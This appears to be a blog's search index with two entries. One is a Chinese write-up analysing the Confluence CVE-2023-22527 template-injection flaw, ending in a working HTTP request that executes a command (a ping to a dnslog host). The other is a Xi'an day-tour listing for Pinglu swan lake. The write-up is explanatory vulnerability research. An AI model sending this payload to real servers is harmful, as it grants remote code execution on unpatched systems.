<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>浅析Confluence_CVE-2023-22527</title>
    <link href="/2024/01/24/%E6%B5%85%E6%9E%90Confluence-CVE-2023-22527/"/>
    <url>/2024/01/24/%E6%B5%85%E6%9E%90Confluence-CVE-2023-22527/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>纵使有前言万语，打开编辑器，但是不知道怎么开头，也不知道如何下笔，敲了删，删了敲，纠结，彷徨，还是随便写写，反正也没人看，当作一段时间的碎碎念吧。</p><p>最近一段时间家里发生了一些事，包括我今年也面临毕业，可是我那三流的末流学校在校招当中犹如有案底一般不被待见。所以不管是工作也好生活也罢，最近状态一直不在线。我想跳出这样一个不良的状态。年关将至，趁着这段时间好好给自己放个假，调整一下自己，新的一年自己也要有些成长。</p><p>关于家里：我想在爷爷剩下的时间里，尽可能的多陪陪他老人家，从小在爷爷奶奶陪伴下成长，我也并不是放荡不羁，反之我觉得自己算得上是个懂事的孩子。</p><p>关于工作：学校虽在末流，可是我也有一颗积极向上的心。我觉得能限制我自己的只有我自己。我也想当一个大厂的社畜，可是连机会都没有。目前只能是走一步看一步，今年的就业形势太糟糕了。大厂各种裁员，小厂坚持不住也有倒了的。总之怨天尤人没有用，别人都可以为什么你不可以？努力吧</p><p>关于学习：工作之后才知道，学了那么多东西真用的时候不一定用得上，但是一定得知道。因为目前一直在实习，学习的重心也偏向安全研究，秋招过后，我才知道自己不属于这个方向。后面还得加强广度学习。等到真找到正式工作之后，再具体定学习重心吧。</p><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><p>本次Confluence的洞实际上是<strong>SSTL（服务端模板注入漏洞）</strong>。因为之前没有了解过这类的漏洞，所以在分析之前还看了几篇相关的文章，链接放在下面，仅供参考。</p><p><a href="https://hackerqwq.github.io/2021/12/14/javaweb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-SSTI%E6%BC%8F%E6%B4%9E/">SSTL基础学习</a></p><p><a href="https://github.blog/2023-01-27-bypassing-ognl-sandboxes-for-fun-and-charities/?ref=blog.projectdiscovery.io#strutsutil:~:text=(PageContextImpl)-,For%20Velocity%3A,-.KEY_velocity.struts2.context">POC构造</a></p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>Confluence使用的是Velocity模板，具体的细节在上面SSTL基础中有涉及到。它是以.vm结尾的文件。而在Confluence中处理.vm的类是<code>ConfluenceVelocityServlet</code>。它主要负责处理请求和解析.vm模板，处理后将结果返回给浏览器。</p><p><img src="https://i.miji.bid/2024/01/24/4ad2b6b190fe5e642d5bfea13a82f82d.png" alt="image-20240124162620127"></p><p>进入到<code>doPost</code>之后会调用<code>doRequest</code>，其中我们只需要关注两个标红的地方。</p><p>首先是第一处，它通过获取请求路径之后，返回一个template对象。</p><p><img src="https://i.miji.bid/2024/01/24/1c72af5b21abd53c94ed351ddbbba5ec.png" alt="image-20240124163235115"></p><p>第二处，我们跟进</p><p><img src="https://i.miji.bid/2024/01/24/0b5abcf3d4f0bc5d01eb4d4311f81e78.md.png" alt="image-20240124164404454"></p><p>前面都是获取一些基础的对象，在try当中获取了PageContext的输出流，将模板和context进行合并将结果保存到输出流之中。我们跟进看下具体实现逻辑。</p><p><img src="https://i.miji.bid/2024/01/24/2847d8df9262a662766f3f9002f94a94.md.png" alt="image-20240124164940588"></p><p>发现在其内部的重载函数中获取了传入的macroLibraries为空，所以直接会跳到try的逻辑中。</p><ol><li>调用 <code>ica.pushCurrentTemplateName(this.name);</code> 将当前模板的名称压入到 <code>ica</code> 的模板名堆栈中。这是为了在嵌套模板的情况下能够追踪到当前正在处理的模板名称。</li><li>调用 <code>ica.setCurrentResource(this);</code> 将当前模板对象设置为 <code>ica</code> 的当前资源。这是为了让 <code>ica</code> 知道当前正在处理的模板资源。</li><li>最后，通过调用 <code>((SimpleNode)this.data).render(ica, writer);</code> 进行模板渲染</li></ol><p>跟进最后渲染的堆栈信息如下：</p><p><img src="https://i.miji.bid/2024/01/24/879d4d6f0fff9af2dbf7da5b70a73e4e.png" alt="image-20240124170150732"></p><p>然后一直到<code>ASTReference#execute</code>中</p><p><img src="https://i.miji.bid/2024/01/24/8e060e406161f880578a609e28def180.md.png" alt="image-20240124170503744"></p><p>通过<code>getVariableValue</code>获取<code>context</code>中的<code>this.rootString</code>的变量。然后调用<code>this.jjtGetChild(i).execute</code>我们再次跟进查看逻辑</p><p><img src="https://i.miji.bid/2024/01/24/08a0c142000c12812f60473276d3e051.png" alt="image-20240124171329699"></p><p>从context中获取到参数后，经过几层调用后会来到<code>OgnIValueStack#findValue</code>其中堆栈信息如下：</p><p><img src="https://i.miji.bid/2024/01/24/02a99371cae141ee07ccac99b6eb67fa.png" alt="image-20240124171940953"></p><p>内部实现：</p><p><img src="https://i.miji.bid/2024/01/24/65e652509c3e9eedd2694408277ea22d.md.png" alt="image-20240124172123270"></p><p>最后会再次调用一边上述流程最终会来到 <code>UberspectImpl#invoke</code>其中堆栈信息如下：</p><p><img src="https://i.miji.bid/2024/01/24/07bedd8337b0f6cf357602683da8b9d9.png" alt="image-20240124172708293"></p><p>最终经过一系列的Invoke调用来到<code>UberSpectImpl#invoke</code>的doInvoke中实现将label参数的OGNL表达式传入执行。</p><p><img src="https://i.miji.bid/2024/01/24/683a34b964141b6bfe704b7ea6d6a98c.md.png" alt="image-20240124173311799"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><img src="https://i.miji.bid/2024/01/24/6613847b1cda2d72cf406fc97d8fbfd5.png" alt="image-20240124173457517"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/template/aui/text-inline.vm</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8090<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>315<br><br><span class="language-reasonml">label=aaa\u0027%<span class="hljs-number">2</span>b#request.get(\u0027.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">KEY_velocity</span>.</span></span>struts2.context\u0027).internal<span class="hljs-constructor">Get(\<span class="hljs-params">u0027ognl</span>\<span class="hljs-params">u0027</span>)</span>.find<span class="hljs-constructor">Value(#<span class="hljs-params">parameters</span>.<span class="hljs-params">poc</span>[0],&#123;&#125;)</span>%<span class="hljs-number">2</span>b\u0027&amp;poc=@org.apache. struts2.ServletActionContext@get<span class="hljs-constructor">Response()</span>.set<span class="hljs-constructor">Header(&#x27;Cmd-Responses-Header&#x27;,(<span class="hljs-params">new</span> <span class="hljs-params">freemarker</span>.<span class="hljs-params">template</span>.<span class="hljs-params">utility</span>.Execute()</span>).exec(&#123;<span class="hljs-string">&quot;ping pog9c1.dnslog.cn&quot;</span>&#125;))</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>平陆天鹅湖-LXG</title>
    <link href="/2023/12/28/%E5%B9%B3%E9%99%86%E5%A4%A9%E9%B9%85%E6%B9%96-LXG/"/>
    <url>/2023/12/28/%E5%B9%B3%E9%99%86%E5%A4%A9%E9%B9%85%E6%B9%96-LXG/</url>
    
    <content type="html"><![CDATA[<h1 id="山西平陆天鹅湖-探秘陕州地坑院-1日游"><a href="#山西平陆天鹅湖-探秘陕州地坑院-1日游" class="headerlink" title="山西平陆天鹅湖 探秘陕州地坑院 1日游"></a>山西平陆天鹅湖 探秘陕州地坑院 1日游</h1><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">产品价格：￥<span class="hljs-number">108</span>起<br><br>积分促销：      <span class="hljs-number">100</span><span class="hljs-comment">%</span><br><br>活动特色：          天鹅湖拍天鹅 神奇地坑院<br><br>目的地：    周边短途<br><br>活动类型： 休闲行摄、 摄影、 休闲运动<br></code></pre></td></tr></table></figure><p><strong>出发日期：</strong></p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">第70期2023<span class="hljs-string">-12</span><span class="hljs-string">-30</span>(周六出发) 至 2023<span class="hljs-string">-12</span><span class="hljs-string">-30</span>￥108报名中<br><br>第71期2023<span class="hljs-string">-12</span><span class="hljs-string">-31</span>(周日出发) 至 2023<span class="hljs-string">-12</span><span class="hljs-string">-31</span>￥108报名中<br><br>第72期2024<span class="hljs-string">-01</span><span class="hljs-string">-01</span>(周一出发) 至 2024<span class="hljs-string">-01</span><span class="hljs-string">-01</span>￥108报名中<br></code></pre></td></tr></table></figure><h2 id="🙋马上预定"><a href="#🙋马上预定" class="headerlink" title="🙋马上预定"></a><a href="https://www.029lvwo.com/outdoor/show_159.html">🙋马上预定</a></h2><hr><h2 id="🖼️活动亮点"><a href="#🖼️活动亮点" class="headerlink" title="🖼️活动亮点"></a>🖼️活动亮点</h2><p>这里是山西平陆黄河湿地</p><p>是中国野生天鹅三大越冬栖息地之一</p><p>每年从10月下旬到来年的3月初</p><p>来自西伯利亚的天鹅都会赶来栖息越冬</p><p><img src="https://i.miji.bid/2023/12/28/0f1f38d656c3fa820fbe3798e5cbf04b.jpeg" alt="1"></p><p>眼下上万只的大天鹅</p><p>已陆续飞临平陆的三湾黄河湿地越冬</p><p>黄河湿地瞬间变成了美丽的“天鹅湖”</p><p>河岸、水上、空中被它们占领</p><p>这些精灵的到来</p><p>与美丽的黄河湿地风光相映成趣</p><p>美丽的湿地风光和天鹅</p><p>简直分分钟要逼疯摄影师们啊</p><p><img src="https://i.miji.bid/2023/12/28/e9f9345adde89e11bbc7bc7f37d9c025.jpeg" alt="2"></p><p><img src="https://i.miji.bid/2023/12/28/7c478c9b78c2afebf1383e96da3a0e32.jpeg" alt="3"></p><p>每年冬季都会有大批天鹅迁徙于此</p><p>于黄河岸边戏水飞翔</p><p>于是这两座城市皆自称“天鹅之乡”</p><p>但是三门峡的天鹅只能远远的观望</p><p>而平陆三湾的天鹅近在咫尺</p><p>大家能与天鹅亲密接触</p><p>所以受到游客和摄影爱好者的青睐</p><p><img src="https://i.miji.bid/2023/12/28/3b55fbc383f2b2465db4036d32268a5b.jpeg" alt="4"></p><p><img src="https://i.miji.bid/2023/12/28/b68919d9317b7ab0e93786a9217695f0.jpeg" alt="5"></p><p><img src="https://i.miji.bid/2023/12/28/20535c994a4bd7d461ed6fb4e348e1d5.jpeg" alt="6"></p><p>地坑院是全国乃至世界唯一的地下古民居建筑</p><p>被誉为地平线下的古村落</p><p>人类穴居的活化石、地下的北京四合院</p><p>是我国特有的四大古民居建筑之一</p><p>据专家考证,地坑院有六千多年的历史</p><p>早在庙底沟文化时期就已经有了地坑院的雏形</p><p>20世纪前期，德国人鲁道夫斯基在</p><p>《没有建筑师的建筑》一书中向全世界介绍了地坑院</p><p><img src="https://i.miji.bid/2023/12/28/9855a9559a28a9b25b2527ba25f04a4a.jpeg" alt="7"></p><p><img src="https://i.miji.bid/2023/12/28/3dba13149145f8a3ab09425a9925030b.jpeg" alt="8"></p><p><img src="https://i.miji.bid/2023/12/28/cbc8445658487b92249c514c88e181ef.jpeg" alt="9"></p><hr><h2 id="🌏行程安排"><a href="#🌏行程安排" class="headerlink" title="🌏行程安排"></a>🌏行程安排</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs makefile">第一天            西安-陕州地坑院-平陆天鹅湖-西安<br><br>🗺️景点：陕州地坑院 平陆天鹅湖<br><br>🍜用餐情况：午餐和饮用水自理🚌交通工具：大巴<br><br>①早上7点南稍门地铁站F口处集合(地铁2号、5号线南稍门站)，沿途乘车点接人出发<br><br>②领队车上介绍活动内容和相关注意事项，一路欢声笑语前往目的地<br><br><span class="hljs-section">③11:00左右到达陕州地坑院，游览神奇特色的地坑院落，品尝当地特色美食</span><br><br><span class="hljs-section">④14:00左右前往平陆天鹅基地景区，近距离拍摄可爱的大天鹅</span><br><br><span class="hljs-section">⑤16:30左右集合返程预计晚9点左右达到西安结束愉快的旅行</span><br><br><br><br>活动说明：<br><br>路线类型：休闲行摄线路<br><br>行程距离：基本无强度，休闲摄影<br><br>适合人群：适合身心健康者<br><br>装备要求：按西安温度着装即可<br><br>行程餐饮：午饭和饮用水建议适量自备，有卖吃的，酌情携带<br><br>其      他：个人常备药品，垃圾袋，个人常用物品等<br></code></pre></td></tr></table></figure><hr><h2 id="💴费用说明"><a href="#💴费用说明" class="headerlink" title="💴费用说明"></a>💴费用说明</h2><h3 id="活动费用"><a href="#活动费用" class="headerlink" title="活动费用"></a>活动费用</h3><p><strong>108元&#x2F;人</strong></p><h3 id="费用包含"><a href="#费用包含" class="headerlink" title="费用包含"></a>费用包含</h3><table><thead><tr><th><strong>用车</strong></th><th><strong>西安起止往返旅游巴士费用</strong></th></tr></thead><tbody><tr><td><strong>保险</strong></td><td><strong>旅行社责任险+赠送旅行意外险</strong></td></tr><tr><td><strong>领队</strong></td><td><strong>全程驴窝领队服务+景区讲解费</strong></td></tr><tr><td><strong>其他</strong></td><td><strong>其他活动组织成本费及共用设备费用，一日游车上缴费</strong></td></tr></tbody></table><h3 id="费用不含"><a href="#费用不含" class="headerlink" title="费用不含"></a>费用不含</h3><table><thead><tr><th><strong>用餐</strong></th><th><strong>午餐和饮用水自理，地坑院有卖吃的，可以酌情携带</strong></th></tr></thead><tbody><tr><td><strong>门票</strong></td><td><strong>全程门票费用自理（陕州地坑院门票70元，团队30元；天鹅湖暂无门票（根据实际政策为准），以实际产生为准，相关优惠证件可享受景区规定优惠）</strong></td></tr><tr><td><strong>其他</strong></td><td><strong>其他个人消费等</strong></td></tr></tbody></table><h3 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h3><table><thead><tr><th><strong>优惠</strong></th><th><strong>关注“驴窝户外”微信公众号，微信分享本活动至朋友圈可享受5元优惠（出发当天和以后分享无效）！</strong></th></tr></thead><tbody><tr><td><strong>其他</strong></td><td><strong>儿童必须报名占座，团费同成人可按分享优惠，门票及其他实际产生为准</strong></td></tr></tbody></table><h3 id="集合地点"><a href="#集合地点" class="headerlink" title="集合地点"></a>集合地点</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">07</span>:<span class="hljs-number">00</span>南稍门十字西南角（地铁站F口）<br><br><span class="hljs-attribute">07</span>:<span class="hljs-number">10</span>太乙路立交（铁一局医院对面公交站）<br><br><span class="hljs-attribute">07</span>:<span class="hljs-number">20</span>长乐公园地铁站C口<br><br><span class="hljs-attribute">07</span>:<span class="hljs-number">25</span>西光厂门口路南天桥下（万寿路地铁站B口）<br><br><span class="hljs-attribute">07</span>:<span class="hljs-number">35</span>堡子村转盘向东方向（半坡地铁站D口<span class="hljs-number">4</span>号出站口路边）<br></code></pre></td></tr></table></figure><h3 id="特别提醒"><a href="#特别提醒" class="headerlink" title="特别提醒"></a>特别提醒</h3><p>年龄在8岁以下或超过70岁,请先咨询客服或领队活动强度后再进行报名！</p><h3 id="报名流程"><a href="#报名流程" class="headerlink" title="报名流程"></a>报名流程</h3><p><strong>1.阅读行程：</strong>请详细阅读活动内容,行程安排及活动强度等事项</p><p><strong>2.报名信息：</strong>按要求填写&#x2F;提供报名信息，进行预报名，提示成功后等待成团短信通知！</p><p><strong>3.出行通知：</strong>活动出行前一天下午17：00左右发“出行短信”，群发短信信息有延迟现象；另外不少智能手机有短信屏蔽功能，请及时到垃圾箱找寻，如未收到信息及时联系我们工作人员。</p><p><strong>4.加活动群：</strong>接到出行通知后，请在个人中心的订单中选择加入本次活动群，方便接收通知，或联系客服邀请入群。</p><p><strong>5.成团说明：</strong>根据活动具体报名情况和天气，有存在不成团的可能，如不够成团人数或天气因素，1-2日活动距出发之时12小时未能达到成团人数，2日以上活动距出发之时3日未能达到成团人数，本次活动可能延期或取消，也可协调其他成团活动，如已缴费可全额申请退款，但不做活动赔偿，报名视为同意成团说明，望周知！</p><p><img src="https://i.miji.bid/2023/12/28/5a6127bf533903e0bea93212b7a8b7bf.png" alt="5a6127bf533903e0bea93212b7a8b7bf"></p><hr><h2 id="📑预定须知"><a href="#📑预定须知" class="headerlink" title="📑预定须知"></a><strong>📑预定须知</strong></h2><h3 id="活动提醒"><a href="#活动提醒" class="headerlink" title="活动提醒"></a>活动提醒</h3><p>**1.**出门旅行都有一定的危险性，请队友充分考虑这一点，凡报名参加者均视为具有完全民事行为能力人或已经过其法定代理人同意参与本次活动，凡报名者均视为接受官网平台公示的本次活动相关行程和说明。</p><p>**2.**参与者需身体健康，请参与者综合考虑自身健康状况及本次活动强度综合考虑是否参与本次活动，如有疾病应在活动前如实告知领队或工作人员，征得同意后方可继续参加活动。活动过程中，领队有权根据参与者个人身体状况决定其能否继续参加本次活动行程，参与者必须配合。</p><p>**3.**本次活动赠送旅行人身意外伤害保险，请报名时主动提供所报人员的真实姓名和证件号码，不提供完整信息视为放弃投保，风险自己承担！且不做退费处理！当已投保的队员发生意外伤害时，公司将尽全力协调保险公司进行保险理赔。如个人自身原因、第三方原因以及不可抗力（如地震、洪水、塌方等自然灾害）造成其自身人身、财产损害的，本公司均不承担责任。</p><p>**4.**根据相关规定，不接受未成年人单独报名参加活动，未满18周岁需由监护人带领，并全程由监护人负责照顾；同时交通法也规定1.2米以下小朋友需要安排独立座位，所以也需要缴纳正常活动费用（其他未产生的我们进行相应退费），请理解并给予合作，谢谢！</p><p>**5.**我们的活动不同于传统旅游线路，对参加团员的安全、环保、消防意识及团队协作精神要求较高。请保持一颗旅行者的宽容心态面对旅行中的一切，在活动过程中相互帮助、相互理解，为美好的一次旅程贡献自己的一份力量！</p><p>**6.**参团人员应充分了解本团队性质(自助游)，没有固定的服务模式和标准，活动纯属半自助游，期间若因不可抗力因素（恶劣天气、堵车、坏车等）导致行程受阻，公司及领队有权根据当地实际情况对行程进行更改，请配合，且保持一份平常心，多一点谅解，多一点宽容，争取活动的圆满完成；</p><p>**7.**行程过程中，服从领队管理，如无特殊情况严禁擅自脱团，自由活动！如因个人原因需中途退出，务必告知领队，离队前则需签署书面的离队脱团协议，离队后的一切安全责任和费用均由个人自行承担。 出游过程中，如产生退费情况，退费项目以旅行社折扣价为依据，均不以挂牌价为准。擅自离队脱队者则视为自愿解除本次活动形成的合同法律关系，本公司不再对其承担责任，已收费用不予退还！</p><p>**8.**因交通延阻、罢工、政变、天气、飞机、火车故障、景点关闭、航班取消或更改时间等不可抗力因素所引致的额外费用，由游客承担，减少或没有产生的费用全额退还。</p><p>**9.**国内游活动的住宿安排一般为两人一标间（即1人1个床位，行程中表明多人间的除外），如出现单男单女，我们尽量安排该客人与其他同性别团友拼房；如不愿拼房，请补齐单房差以享用整个房间。如单人报名要求单独住一个房间的，需致电客服确认是否能安排，单房差自理。如两人报名要求男女一起报名的，如不能同住一间房的，需在报名时备注栏内备注清楚。</p><p>**10.**活动期间如认为本俱乐部行为存在违反行程约定的情况时，应立即向领队反映，未得到满意解决时，可及时拨打办公室值班电话18709263033，我们会第一时间处理。如果在整个旅行过程中，您未进行投诉，而在结束行程后提起投诉的话不再受理。</p><h3 id="装备建议"><a href="#装备建议" class="headerlink" title="装备建议"></a>装备建议</h3><p><strong>1.鞋子：</strong>休闲游玩行摄活动，方便活动的运动鞋即可，建议不要穿皮鞋、高跟鞋和拖鞋！</p><p><strong>2.裤子：</strong>宽松透气运动裤，牛仔裤，方便活动即可！</p><p><strong>3.衣服：</strong>户外休闲对于衣服的要求不是特别严格，按西安温度着装即可！拍摄花建议漂亮适合拍照的服装！</p><p><strong>4.餐饮：</strong>餐食和饮用水自理，请按活动行程内的提示酌情准备！</p><p><strong>5.拍摄：</strong>请自行携带手机、相机、充电宝等拍摄工具！</p><p><strong>6.证件：</strong>请携带有效身份证证件和优惠证件！</p><p><strong>7.药品：</strong>个人常备药品，晕车药，感冒药，消化系统药等</p><p><strong>8.其他：</strong>小背包，塑料袋，雨具等个人其他物品</p><h3 id="分享优惠"><a href="#分享优惠" class="headerlink" title="分享优惠"></a>分享优惠</h3><p>1.打开微信搜索“<strong>驴窝户外</strong>”</p><p>2.找到“<strong>驴窝户外</strong>”公众微信号并关注</p><p>3.选择下方“<strong>我的旅行</strong>”选项找到对应活动</p><p>4.打开活动右上角“…”</p><p>5.选择分享到朋友圈</p><p>6.车上领队收费时打开分享记录</p><p>7.领队确认后直接按优惠价执行</p><h3 id="退改政策"><a href="#退改政策" class="headerlink" title="退改政策"></a>退改政策</h3><p>因目前一日游活动为车上缴费，请大家诚信报名！</p><p>1.出发前一天活动取消可自行在个人中心，活动订单里进行取消或增减人数！</p><p>2.如出发当天您有急事无法正常参加活动请及时联系我们客服或者领队进行告知！</p><p>※无故报名后不参加者，报名程度度会降低，会影响您以后的报名和享受以后的其他权益！</p><h3 id="关于保险"><a href="#关于保险" class="headerlink" title="关于保险"></a>关于保险</h3><p>我们所有活动都给大家赠送保险，但需要您配合我们提供给我们所有参与活动人员的真实姓名和身份证号码,不提供者或提供不全者视为放弃保险！</p><p><em>我们建议您根据自身情况结合我们赠送的保险，再自行购买其他类型的保险！！！！！</em></p><p>保险购买时间一般在活动出发前一天下午购买！</p><p>我们为大家赠送的保险为以下内容：</p><table><thead><tr><th>第1部分：意外伤害及医疗保障</th><th></th></tr></thead><tbody><tr><td>意外身故&#x2F;残疾</td><td>20万元</td></tr><tr><td>意外医疗</td><td>2万元</td></tr><tr><td>意外住院津贴（50元&#x2F;天，30天为限）</td><td>50元&#x2F;天</td></tr><tr><td>急性病身故</td><td>1万元</td></tr><tr><td>急性病医疗</td><td>2万元</td></tr><tr><td>第2部分：生命健康及医疗保障</td><td></td></tr><tr><td>急性病住院津贴</td><td>10元&#x2F;天</td></tr></tbody></table><p>保险的详细条款链接：</p><p><a href="https://www.029lvwo.com/public/insurance/plan-b/">慧旅游-任性游——计划B</a></p><p><strong>如果因自身原因出现人身及财产损失，将按有关法律、法规及保险合同约定由保险公司进行赔偿；保险公司不承担的部分则由参团人员自行承担！</strong></p><p><strong>希望大家知悉！</strong></p><h3 id="其他事项"><a href="#其他事项" class="headerlink" title="其他事项"></a>其他事项</h3><p><strong>一、预定限制</strong></p><p>1、健康约定：本产品不接受以下病患者报名：传染性疾病、心血管疾病、脑血管疾病、呼吸系统疾病、精神病、严重贫血病、大中型手术的恢复期病患者、孕妇及行动不便者以及其他不适宜出行者。出于旅游安全考虑，请旅游者清楚个人身体情况是否适合本次行程，有必要的情况下做一次身体检查，预订人请务必准确、及时转达并核实旅游者的身体状况后再报名，否则由此引发的不良后果和所有费用由预订人和旅游者自行承担。</p><p>2、未成年人约定：18周岁以下未成年人须由父母报名方可出行；16周岁以下未成年人需由父母或由父母指定的临时监护人陪同，如同行人员中有未成年人无父母陪同出游的，同行的成年出游人均视为未成年人的临时监护人，负责全程看管、照顾未成年人，如隐瞒参团发生事故，责任自负。如有隐瞒未成年人身份信息的，法律责任自行承担。</p><p>3、老年人约定：70周岁（含）以上老年人必须在有至少1位18周岁-69周岁亲友陪同的情况下方可出行。驴窝户外的旅游行程对旅游者体能有一定要求：行程中可能途径高山或低谷地区，通常在平原生活的人会有身体不适或强烈的应激反应；火车、飞机、轮船、汽车等交通工具上均出现过老年人因身体不适而发生人身意外伤害的事故，同时也会有徒步需要一定体能要求的行程线路，为保证旅游安全和顺利进行，老年人必须在确保身体良好的情况下参加，如有特殊病史或有不宜参加的旅程（项目）应及时书面告知工作人员，如有隐瞒身体健康状况的，由此引发的不良后果和所有费用由本人自行承担。</p><p><strong>二、预定须知</strong></p><p>1、请您在预订时务必提供准确、完整的信息（姓名、性别、证件号码、联系方式、是否有特殊证件），以免产生预订错误，影响出行。如因客人提供错误个人信息而造成损失，应由客人自行承担因此产生的全部损失。</p><p>2、因意外事件或不可抗力，包括但不限于交通延阻、罢工、天气、飞机火车故障、航班取消或更改时间及突发疫情等不可归责于旅行社的原因导致行程取消或变更的，旅游者与旅行社均不承担违约责任，我们将尽最大的努力协助您办理变更事宜，如产生差价，多退少补。如您要求解除合同的，将按照《旅游法》第67条处理。</p><p>3、户外线路、偏远地区线路由于路途相对较为艰辛，各项条件比不上发达地区，希望参加者有合理的心理预期。摄影线路由于其线路的特殊性，拍摄需要早出晚归，参加者须对自身身体状况有合理的判断，有高血压、心脏病、冠心病等心血管疾病的队员谢绝参加。代他人报名者，须准确、及时转告。</p><p>4、报名成功后，最晚在出行前1天您将收到出团短信或工作人员的确认电话，敬请留意，保持电话畅通。集合时间请以出团通知书或工作人员短信通知为准。若超时未联系，请联系客服人员。出行当日请凭预留的出行人姓名+联系手机在约定时间前，前往约定地点等候。</p><p>5、 如网页产品的条款约定与旅游合同主协议（示范文本）不一致的，以网页的约定为准。</p><p><strong>三、产品说明</strong></p><p>1、住宿说明：一般按照2成人入住1间房（即1成人1个床位，行程中表明多人间的除外）。如您报名为单人，将尽量安排与其他同性别团友或随团工作人员拼房；如不愿拼房，您需自理单房差以享用整个房间。单男单女报名在同一订单下，如未在备注栏特别说明，默认安排住一间房。</p><p>2、团队行程中，非自由活动期间，未经带队队长同意，旅游者不得擅自离团或脱团。如因个人原因不得不中途退出的，离团或脱团后可能发生的任何意外需您自行承担责任，未完成部分将被视为您自行放弃，已实际产生损失的行程，不退任何费用。</p><p>3、赠送项目，旅行社不承担退费或者赔偿的责任。客人有权选择参加或者不参加，如因景区的原因或者不可抗力等客观因素则取消该项目安排。</p><p>4、出游过程中，如遇不可抗力因素造成未能正常游玩景点，经与旅游者协商后可根据实际情况取消或更换该景点，或由旅行社在现场按旅游产品中的门票价退还费用，退费不以景区挂牌价为准，敬请谅解。</p><p>5、本产品行程实际出行中，在不减少景点且征得客人同意的前提下，随团工作人员或带队队长、司机可能会根据天气、交通等情况，对您的行程进行适当调整（如调整景点游览顺序等），以确保行程顺利进行。</p><p>6、请在约定的时间到达上车地点集合，切勿迟到，以免耽误其他游客行程。若因迟到导致无法随团游览，也未能在出发途中加入旅游团队的，视为旅游者在出发当日解除合同。</p><p>7、出游过程中，如产生退费情况，按退费项目旅行社折扣价退还费用，不以景区挂牌价为准，敬请谅解。</p><p>8、具体酒店信息，请以最终通知为准。</p><p><strong>四、发票索取</strong></p><p>发票开具有效期：1个月（自活动结束之日起，一个月内可申请登记发票信息，逾期视为自动放弃开具发票），联系客服索取发票申请，如有疑问请电询。</p><p><strong>五、合同和出团通知</strong></p><p>合同：出团前1天或出团当天车上领队协助签订电子合同。</p><p>行程通知：工作人员将在出行前，通过短信通知。集合时间、地点请以短信通知为准。请保持电话畅通，以便工作人员可以联系上您。</p><p><strong>六、出行